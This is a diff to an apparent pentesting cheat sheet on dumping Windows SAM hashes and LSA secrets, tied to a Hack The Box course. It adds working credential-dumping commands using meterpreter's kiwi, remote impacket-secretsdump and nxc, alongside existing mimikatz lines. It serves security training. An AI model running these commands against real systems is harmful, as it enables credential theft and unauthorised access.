@@ -198,6 +198,12 @@ mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive
 mimikatz# lsadump::sam /system:./system.hive /sam:./sam.hive /security:./security.hive
 ```
 
+If you have a meterpreter, you can use kiwi:
+
+```shell!
+meterpreter> load kiwi; lsa_dump_sam
+```
+
 From Linux, you can dump hashes from SAM using:
 
 ```shell!
@@ -210,6 +216,12 @@ On Linux, you can analyze locally downloaded hives using:
 ```shell!
 PS> reg save [...] # and send them to Linux
 $ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL
+```
+
+On Linux, you can remotely dump hashes using impacket:
+
+```shell!
+$ impacket-secretsdump example.com/username:password@TARGET
 ```
 
 On Windows, you can use [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/) <small>(1.5k ⭐, 👻)</small> too.
@@ -265,10 +277,24 @@ mimikatz# vault::cred
 
 #### Dump LSA Secrets
 
+[![active_directory_enumeration_attacks](../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
 From Linux, you can use:
 
 ```shell!
 $ nxc smb IP --local-auth -u xxx -p yyy --lsa # dump secrets
+```
+
+If you have a meterpreter, you can use kiwi:
+
+```shell!
+meterpreter> load kiwi; lsa_dump_secrets
+```
+
+On Linux, you can remotely dump them using impacket:
+
+```shell!
+$ impacket-secretsdump example.com/username:password@TARGET
 ```
 
 <br>
